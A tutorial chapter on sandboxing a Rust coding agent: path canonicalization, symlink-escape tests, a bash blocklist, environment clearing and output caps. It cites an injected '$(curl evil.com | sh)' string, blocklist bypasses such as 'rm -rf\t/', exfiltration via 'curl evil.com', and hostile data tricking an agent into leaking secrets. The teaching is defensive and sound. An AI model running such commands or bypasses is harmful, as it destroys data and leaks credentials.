# Chapter 5: Sandboxing — The Agent's Safety Rails

> "In theory there is no difference between theory and practice. In practice there is." — Yogi Berra

A coding agent that edits files and runs shell commands is, from
the operating system's point of view, just a very chatty user
with a very fast keyboard. If the model decides — or hallucinates,
or is tricked into deciding — that it should `rm -rf ~/`, nothing
in the LLM API will stop it. The only thing standing between your
agent and your home directory is the harness code you wrote.

This chapter is about that code. The file is `src/tool_runners.rs`
and the ideas are simple, ancient, and have been reinvented by
every system that lets untrusted code run on trusted machines.
What's new is applying them to a component that writes its own
commands in English.

## 5.1 The Threat Model

Before defences, threats. In `rust_toy_agent` we worry about three
classes of failure:

1. **Honest mistakes.** The model meant to edit `src/main.rs`, got
   confused about the workdir, and wrote `../../main.rs` or
   `/etc/passwd`. This is the most common failure by far and the
   easiest to defend against.

2. **Path-traversal exploitation.** A repository the agent is
   reading contains a symlink called `README.md` that points at
   `/etc/shadow`. The model happily reads it and pastes the
   contents into the next tool call. The human in the loop might
   notice; the CI pipeline running overnight will not.

3. **Command-injection exploitation.** A file the model is
   processing contains a string like `$(curl evil.com | sh)`, the
   model embeds it in a `bash` command without quoting, and now
   an attacker has shell. This is the nastiest class, because
   the attack vector is *data*, not *instructions*.

We do *not* worry about a model deliberately trying to escape the
sandbox. Production agents should, and large labs have whole teams
thinking about it. For our purposes, assume the model is trying to
help and the hostile input is coming through data channels.

## 5.2 The Workdir Root

Every tool runner in `rust_toy_agent` takes a `WorkdirRoot`:

```rust
#[derive(Clone)]
pub struct WorkdirRoot {
    original: PathBuf,
    canonical: PathBuf,
}

impl WorkdirRoot {
    pub fn new(path: &Path) -> Result<Self, String> {
        let canonical = path.canonicalize()
            .map_err(|e| format!("canonicalize workdir: {e}"))?;
        Ok(Self { original: path.to_path_buf(), canonical })
    }
}
```

Three observations:

1. **The canonical path is computed once, at construction.**
   `canonicalize()` is a syscall — it resolves symlinks, converts
   relative paths to absolute, and returns an absolute path with
   no `.` or `..` left. Doing it per call would be wasteful; doing
   it once means every subsequent check is a pure string compare.

2. **Both the original and canonical forms are stored.** The
   original is what the human typed and what shows up in log
   messages and tool output. The canonical is what the sandbox
   check uses. Do not confuse the two and do not collapse them
   into one field — users hate seeing their home directory
   expanded into `/Users/jane/Library/.../tmp-xyz`, and sandbox
   checks on uncanonicalized paths are easy to bypass.

3. **`new` returns `Result`, not `Option`.** If canonicalization
   fails — the path doesn't exist, permissions deny access, the
   filesystem hiccups — the harness knows *why* and can tell the
   user. Never collapse an error into `None`; you lose the one
   piece of information that would let the user fix the problem.

A `WorkdirRoot` is constructed once per agent session and threaded
through every tool call. It is the *only* thing that grants
access to the filesystem, and it grants access to exactly one
subtree.

## 5.3 `safe_path`: The Workhorse

Every file operation begins with this function:

```rust
pub fn safe_path(p: &str, workdir_root: &WorkdirRoot)
    -> Result<PathBuf, String>
{
    let workdir_canon = workdir_root.as_canonical();
    let workdir = workdir_root.as_path();
    let joined = workdir.join(p);
    let resolved = canonicalize_partial(&joined)?;
    if !resolved.starts_with(workdir_canon) {
        return Err(format!("path escapes sandbox: {p}"));
    }
    Ok(resolved)
}
```

Four steps:

1. **Join the user path onto the workdir.** If the model passes
   `src/main.rs` and the workdir is `/home/jane/project`, the
   joined path is `/home/jane/project/src/main.rs`. This is the
   same as `os.path.join` in Python. Note: if the user passes an
   *absolute* path like `/etc/passwd`, `join` in Rust (and Python,
   and every other language) throws away the base — the joined
   path is just `/etc/passwd`. We handle that in step 3.

2. **Canonicalize.** `canonicalize_partial` resolves `.` and `..`,
   follows symlinks, and returns an absolute path. The "partial"
   bit is that it handles paths to files that *don't exist yet*
   — necessary for `write_file` — by canonicalizing the deepest
   existing ancestor and appending the tail.

3. **Check the prefix.** `resolved.starts_with(workdir_canon)` is
   the sandbox. If the canonical form of the resolved path does
   not begin with the canonical workdir, reject. This handles
   `../../etc/passwd` (resolves to outside the workdir), absolute
   paths like `/etc/passwd` (ditto), and symlink escapes (the
   symlink target is resolved before the check).

4. **Return the resolved path** for the caller to actually use.
   Crucially, the caller uses the *canonical* path, not the
   user-supplied string. This prevents a TOCTOU race where the
   path is valid during the check but points somewhere else when
   the file operation runs. In Rust the race is narrower than in
   C because the filesystem API takes a `&Path`, but the
   principle stands: check and use the same object.

One line in `safe_path` is worth its weight in gold. `starts_with`
on a `PathBuf` is component-wise, not byte-wise. That is,
`/home/jane/project-evil` does not start with `/home/jane/project`
as a path prefix, even though it does as a string prefix. Getting
this wrong is a classic sandbox-escape bug. Rust's `Path::starts_with`
gets it right; Python's `str.startswith` does not. Know the
difference.

## 5.4 Symlink Traversal — The Hard Case

The test suite has this gem:

```rust
#[test]
#[cfg(unix)]
fn symlink_outside_workdir_is_rejected() {
    let tmp = tempfile::TempDir::new().unwrap();
    let outside = tempfile::TempDir::new().unwrap();
    std::fs::write(outside.path().join("secret"), "x").unwrap();
    let link = tmp.path().join("escape");
    std::os::unix::fs::symlink(outside.path(), &link).unwrap();
    let wr = WorkdirRoot::new(tmp.path()).unwrap();
    let bad = safe_path("escape/secret", &wr);
    assert!(bad.is_err());
}
```

The test constructs exactly the nasty case: a symlink inside the
workdir that points at a directory *outside* the workdir. The
naive check — "does the string `escape/secret` contain `..`?" —
says no, and a naive sandbox would let the read through.
`safe_path` rejects it because `canonicalize_partial` follows the
symlink before the prefix check, and `/tmp/other/secret` does not
start with `/tmp/workdir`.

Write this test for your own agent. Every time. It is the fastest
way to catch a sandbox regression — and sandbox regressions are
subtle, because the happy path still works fine.

A related risk: **symlinks created mid-session**. The model runs
`bash ln -s /etc/passwd foo` and then calls `read_file foo`. In
`rust_toy_agent` that also gets caught, because `read_file` goes
through `safe_path` every time and canonicalizes fresh. A weaker
design would cache the canonical form of each path and miss the
new symlink. **Do not cache sandbox checks.**

## 5.5 The Bash Allowlist

Shell commands cannot be sandboxed through path-checking alone —
the whole point of a shell is to invoke arbitrary programs. So
`run_bash` takes a different, cruder approach:

```rust
pub fn run_bash(command: &str, workdir: &Path) -> String {
    let blocked = ["rm -rf /", "sudo", "shutdown", "reboot", "> /dev/"];
    if blocked.iter().any(|b| command.contains(b)) {
        return "Error: Dangerous command blocked".to_string();
    }
    let mut cmd = Proc::new("sh");
    cmd.arg("-c").arg(command);
    cmd.current_dir(workdir);
    cmd.env_clear();
    for key in BASH_ENV_ALLOWLIST {
        if let Ok(val) = std::env::var(key) {
            cmd.env(key, val);
        }
    }
    // ...
}
```

Two defences: a substring **blocklist** for obvious footguns and
an environment **allowlist** via `env_clear`. Both are worth
understanding separately.

**The blocklist is best-effort.** The comment in the source spells
this out: `a best-effort guard against obvious footguns, NOT a
security boundary`. A determined attacker bypasses
`"rm -rf /"` trivially with `rm -rf\t/`, `/bin/rm -rf /`, `bash -c
"r""m -rf /"`, or any of a hundred other tricks. The blocklist is
there to catch the model doing something honestly stupid, not to
stop a hostile model. **Do not rely on a blocklist for security.**
Real isolation comes from running the agent in a VM, a container,
or (at minimum) as a user with no access to anything valuable.

**The environment allowlist is a real defence.** `cmd.env_clear()`
wipes every environment variable, and then the loop adds back
only the ones in `BASH_ENV_ALLOWLIST`. This matters for three
reasons:

1. **Secrets in the parent environment stay there.** If the human
   ran the agent with `ANTHROPIC_API_KEY` set, that variable is
   in the parent process's environment. Without `env_clear`, the
   model's `bash` calls inherit it — and a `bash printenv` returns
   the key, which ends up in the conversation history, which
   ends up in logs, which is a leak.

2. **`PATH` is controlled.** If the agent runs with a carefully
   constructed `PATH` that points only at trusted directories,
   wiping and replacing it means the model cannot override it by
   prepending `/tmp/evil`.

3. **Variables that affect tool behaviour are deterministic.**
   `LANG`, `TZ`, `LC_ALL`, and friends change how shell commands
   format output. A deterministic environment means deterministic
   tool results, which means a reproducible agent.

The allowlist in `rust_toy_agent` is small — just the few
variables the model actually needs to see (`PATH`, `HOME`, `USER`,
`TERM`, etc.). Look it up in `config.rs`. When you write your own
agent, start with an empty allowlist and add only what breaks.

## 5.6 Output Caps as Sandboxing

One more piece, often overlooked:

```rust
if text.len() > MAX_TOOL_OUTPUT_BYTES {
    text[..MAX_TOOL_OUTPUT_BYTES].to_string()
}
```

`MAX_TOOL_OUTPUT_BYTES` is 50 KB. Every tool output is capped at
this size. This is not a size optimization — it is a defence.

The attack it prevents: the model runs `cat /dev/urandom` or
`dmesg` or `find / -type f 2>/dev/null` and tries to read
megabytes of output into the context. Without a cap:

* **The context window blows up.** One tool call eats your entire
  token budget and the agent dies on the next round.
* **The API bill explodes.** You pay for every token, twice —
  once on the way in, once on the way out.
* **Log files bloat.** Observability becomes expensive.
* **Downstream parsers hang.** A 100-MB string in a JSON blob is
  a denial-of-service on every piece of code that touches the
  conversation.

A 50 KB cap is not a clever number. It is "about ten full screens
of text," which is enough for any single useful observation and
little enough that the model has to be strategic. When it hits
the cap, the model sees `(output truncated, 1_234_567 bytes
total)` and adjusts — usually by adding `| head`, `| grep`, or
`| wc -l` on the next turn. The cap *teaches* the model to be
economical with its reads. A bigger cap is a worse cap.

## 5.7 What This Doesn't Protect Against

It is worth being honest about what sandboxing at the harness
layer *cannot* do. `rust_toy_agent`'s defences do not stop:

* **Network access.** `bash curl evil.com` works fine. If your
  threat model includes exfiltration, you need network isolation
  at the OS layer (firewall rules, `unshare --net`, container
  networking off).
* **Forkbombs, memory bombs, CPU hogging.** Nothing caps the
  total resource usage of a `bash` call. A rogue tool can eat the
  host. Production deployments use `ulimit`, cgroups, or a whole
  VM.
* **Persistent changes inside the workdir.** The sandbox keeps
  writes inside the workdir, which is exactly what we want — but
  that means the agent can happily corrupt the workdir itself.
  Use git. Commit often. Branch per agent session. Chapter 10
  gets into git worktree isolation.
* **Data exfiltration through tool outputs.** A model that reads
  `~/.ssh/id_rsa` — assuming the sandbox lets it through, which
  it doesn't here — can write the contents into a `tool_result`
  and from there into the logs. This is why Chapter 4 warns about
  secrets in the environment: the weakest link is whatever is
  already inside the sandbox.

Sandboxing is layered, and the harness layer handles the layer it
can: path traversal, env leakage, output bloat. The other layers
(OS, network, git) are outside the scope of a single file but not
outside the scope of a responsible agent.

## 5.8 Exercises

1. Find `BASH_ENV_ALLOWLIST` in `src/config.rs`. List every
   variable, and for each one write a sentence explaining why
   it's on the list. Could you remove any?

2. The blocklist contains `"rm -rf /"`. Think of three ways the
   model could bypass it using legal shell syntax. Now think of
   one that a human reviewer would probably not notice at first
   glance. Does the blocklist still seem useful?

3. Write a test that creates a file `workdir/link` symlinked to
   `workdir/../outside/file`. What does `safe_path("link", ...)`
   return? Why?

4. `MAX_TOOL_OUTPUT_BYTES` is a single constant. Propose a
   policy where different tools have different caps —
   `read_file` can return more, `bash` returns less. What
   problems does that solve? What new problems does it create?

5. Suppose the model runs `cat ~/.env`. The home directory is
   outside the workdir, so `read_file` would reject it. But
   `bash` does not route through `safe_path`. Why not? Should
   it? How would you even express "block reads outside workdir"
   inside a shell command?

In Chapter 6 we step back up to the conversation layer and look
at how the harness manages context over hundreds of turns:
truncation, compaction, message pairing invariants, and the
token budget math that keeps a long-running agent from drowning
in its own history.
